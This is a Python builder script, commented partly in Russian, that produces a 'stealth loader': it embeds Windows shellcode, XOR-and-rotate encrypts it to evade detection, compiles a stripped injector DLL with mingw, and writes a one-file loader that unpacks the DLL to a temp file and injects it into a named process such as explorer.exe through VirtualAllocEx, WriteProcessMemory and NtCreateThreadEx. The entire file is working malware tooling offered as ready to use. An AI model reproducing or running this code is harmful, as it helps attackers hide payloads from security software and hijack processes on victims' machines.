import os
import subprocess
import zlib
import sys
import hashlib

# ====================== ОСНОВНОЙ КЛЮЧ ======================
MASTER_KEY = b"\xAA\xBB\xCC\xDD\xEE\xFF\x11\x22\x33\x44\x55\x66\x77\x88\x99\x00"  # 16 байт
# =========================================================

shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x63\x6d\x64\x2e\x65\x78\x65\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\x48\x31\xc9\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"

def run_command(cmd):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Error: {result.stderr.strip()}")
        return False
    return True

def quick_hash(key_bytes):
    h = hashlib.sha256(key_bytes).digest()
    return h

def derive_xor_and_rot(key_bytes):
    h = quick_hash(key_bytes)
    
    # A = XOR key = первый + последний байт хэша
    xor_key = (h[0] + h[-1]) & 0xFF
    
    # B = ROT = сумма всех байт хэша по модулю 7 (чтобы было 1-7)
    rot = sum(h) % 7 + 1
    
    return xor_key, rot

def main():
    xor_key, rot = derive_xor_and_rot(MASTER_KEY)
    print("================================================")
    print("     Full Stealth Loader Builder")
    print("================================================")
    print(f"[+] MASTER_KEY (hex): {MASTER_KEY.hex()}")
    print(f"[+] Derived XOR_KEY : 0x{xor_key:02X}")
    print(f"[+] Derived ROT     : {rot}")

    # 1. Генерация encrypt_shellcode.py
    print("[+] Generating shellcode encryptor...")

    formatted_shellcode = "b'" + "".join(f"\\x{b:02x}" for b in shellcode) + "'"

    encrypt_code = f'''import sys

xor_key = {xor_key}
rot = {rot}

shellcode = {formatted_shellcode}

encrypted = bytearray()
for b in shellcode:
    b = (b ^ xor_key) & 0xFF
    b = ((b << rot) & 0xFF) | (b >> (8 - rot))
    encrypted.append(b)

print("// Encrypted shellcode (XOR = 0x{{:02X}}, ROT = {{}})".format(xor_key, rot))
print("unsigned char encrypted_payload[] = {{")
print(", ".join("0x{{:02x}}".format(b) for b in encrypted))
print("}};")
print("unsigned int payload_len = {{}};".format(len(encrypted)))
'''

    with open("encrypt_shellcode.py", "w") as f:
        f.write(encrypt_code)

    # 2. Генерация helper.c
    print("[+] Generating helper.c...")
    helper_code = f'''#include <windows.h>

__declspec(dllexport) const unsigned char* GetEncryptionKey(unsigned int* out_len) {{
    static const unsigned char key[] = {{ {", ".join("0x{:02x}".format(b) for b in MASTER_KEY)} }};
    *out_len = sizeof(key);
    return key;
}}

__declspec(dllexport) void DummyExport() {{
    volatile int x = 42;
}}
'''
    with open("helper.c", "w") as f:
        f.write(helper_code)

    # 2. Сборка
    print("[+] Generating encrypted shellcode...")
    run_command("python3 encrypt_shellcode.py > encrypted_payload.h")

    print("[+] Building helper.dll...")
    run_command('x86_64-w64-mingw32-gcc -shared -o helper.dll helper.c -Wl,--subsystem,windows -s -O2')
    run_command('strip helper.dll')

    print("[+] Converting helper.dll to C array...")
    run_command("python3 bin2c.py helper.dll > helper_data.h")

    print("[+] Building stealth_injector.dll...")
    run_command('x86_64-w64-mingw32-gcc -shared -o stealth_injector.dll stealth_injector.c -Wl,--subsystem,windows -s -O2 -fno-stack-protector')
    run_command('strip stealth_injector.dll')

    # 3. Создаём финальный one-file loader
    print("[+] Creating stealth_loader.py (one-file)...")

    with open("stealth_injector.dll", "rb") as f:
        dll_data = f.read()

    compressed = zlib.compress(dll_data, level=9)

    formatted_compressed = "b'" + "".join(f"\\x{b:02x}" for b in compressed) + "'"

    loader_code = f'''import ctypes
import sys
import struct
import zlib
import tempfile
import os

if sys.platform != "win32":
    print("[-] This script works only on Windows")
    sys.exit(1)

# ====================== EMBEDDED COMPRESSED DLL ======================
COMPRESSED_DLL = {formatted_compressed}

def get_dll_bytes():
    """Распаковывает встроенную DLL"""
    return zlib.decompress(COMPRESSED_DLL)

# ====================== STRUCTURES ======================
class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong),
        ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong),
        ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong),
        ("szExeFile", ctypes.c_char * 260),
    ]

# ====================== FUNCTIONS ======================
def get_pid_by_name(process_name: str) -> int:
    kernel32 = ctypes.windll.kernel32
    snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if kernel32.Process32First(snapshot, ctypes.byref(pe)):
        while True:
            if pe.szExeFile.decode('utf-8', errors='ignore').lower() == process_name.lower():
                kernel32.CloseHandle(snapshot)
                return pe.th32ProcessID
            if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snapshot)
    raise ValueError(f"Process '{{process_name}}' not found")

def inject_dll(pid: int, dll_path: str):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h_process:
        raise ctypes.WinError()

    try:
        path_bytes = (dll_path + '\\0').encode('utf-16le')
        size = len(path_bytes)

        remote_mem = kernel32.VirtualAllocEx(h_process, None, size, 0x3000, 0x04)
        if not remote_mem:
            raise ctypes.WinError()

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, path_bytes, size, ctypes.byref(written))

        h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
        # loadlib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
        loadlib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")

        h_thread = ctypes.c_void_p(0)
        status = ntdll.NtCreateThreadEx(
            ctypes.byref(h_thread), 0x1FFFFF, None, h_process,
            loadlib_addr, remote_mem, 0, 0, 0, 0, None
        )

        if status == 0:
            print(f"[+] stealth_injector.dll successfully injected into PID {{pid}}")
            kernel32.WaitForSingleObject(h_thread, 10000)
        else:
            print(f"[-] NtCreateThreadEx failed (0x{{status:08X}}), trying CreateRemoteThread...")
            h_thread_fallback = kernel32.CreateRemoteThread(h_process, None, 0, loadlib_addr, remote_mem, 0, None)
            if h_thread_fallback:
                print(f"[+] CreateRemoteThread succeeded")
                kernel32.WaitForSingleObject(h_thread_fallback, 10000)
                kernel32.CloseHandle(h_thread_fallback)
            else:
                print(f"[-] CreateRemoteThread also failed")
    finally:
        kernel32.CloseHandle(h_process)
        if 'h_thread' in locals() and h_thread and h_thread.value:
            kernel32.CloseHandle(h_thread)

# ====================== MAIN ======================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python stealth_loader.py <target_process>")
        print("Example: python stealth_loader.py explorer.exe")
        sys.exit(1)

    target = sys.argv[1]

    try:
        dll_bytes = get_dll_bytes()
        print(f"[+] Loaded embedded DLL: {{len(dll_bytes):,}} bytes")

        # Создаём временный файл
        fd, dll_path = tempfile.mkstemp(suffix='.dll')
        os.close(fd)
        with open(dll_path, "wb") as f:
            f.write(dll_bytes)

        pid = get_pid_by_name(target)
        print(f"[+] Found {{target}} → PID: {{pid}}")

        inject_dll(pid, dll_path)

        # Удаляем временный файл
        try:
            os.remove(dll_path)
        except:
            pass

    except Exception as e:
        print(f"[-] Error: {{e}}")
'''

    with open("stealth_loader.py", "w", encoding="utf-8") as f:
        f.write(loader_code)

    print(f"[+] stealth_loader.py successfully generated!")
    print(f"[+] Ready to use: python3 stealth_loader.py explorer.exe")

if __name__ == "__main__":
    main()